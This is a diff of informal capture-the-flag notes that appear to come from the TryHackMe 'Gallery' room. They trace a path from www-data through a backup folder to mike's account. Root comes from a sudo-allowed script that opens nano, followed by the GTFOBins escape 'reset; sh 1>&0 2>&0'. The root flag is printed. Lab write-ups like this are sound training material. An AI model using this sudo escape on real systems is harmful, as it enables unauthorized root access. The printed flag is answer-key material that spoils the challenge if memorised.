@@ -114,6 +114,7 @@ select * from users;
 
 MariaDB [gallery_db]> 
 
+always try to check backups ... i just entered space bar got some file mike 1 is intresting so tried mike folder
 
 www-data@gallery:/$ cd /var/backups/mike_home_backup/
 www-data@gallery:/var/backups/mike_home_backup$ cat .
@@ -213,32 +214,26 @@ case $ans in
     list)
         /usr/bin/rkhunter --list;;
     read)
-        /bin/nano /root/report.txt;;
+        /bin/nano /root/report.txt;; -----------> //we can try nano in GTFOBINS
     *)
         exit;;
 esac
+
+  messed up  with shells :>
+ 
 mike@gallery:~$ /bin/bash -p
 mike@gallery:~$ sudo -u root bash /opt/rootkit.sh 
 Would you like to versioncheck, update, list or read the report ? read
 Error opening terminal: unknown.
-mike@gallery:~$ sudo -u root bash /opt/rootkit.sh 
-Would you like to versioncheck, update, list or read the report ? read
-Error opening terminal: unknown.
-mike@gallery:~$ nano                              
-Error opening terminal: unknown.
-mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
-Would you like to versioncheck, update, list or read the report ? read
-Error opening terminal: unknown.
-mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
-Would you like to versioncheck, update, list or read the report ? read
-Error opening terminal: unknown.
-mike@gallery:~$ export TERM=xterm; export SHELL=/bin/bash
-mike@gallery:~$ stty raw -echo;fg
-bash: fg: current: no such job
-                              mike@gallery:~$export TERM=xterm; export SHELL=/bin/bash 
+mike@gallery:~$export TERM=xterm; export SHELL=/bin/bash 
 
-mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
-^R^X
+
+
+mike@gallery:~$ sudo /bin/bash  /opt/rootkit.sh
+ open with nano (sudo perm)
+
+
+press CTRL+R & CTRL+X
 reset; sh 1>&0 2>&0
 
 total 52
@@ -257,4 +252,4 @@ drwxr-xr-x  3 root root 4096 May 20  2021 .local
 drwx------  2 root root 4096 May 20  2021 .ssh
 # cat root.txt
 THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
-# 
+#tada:)
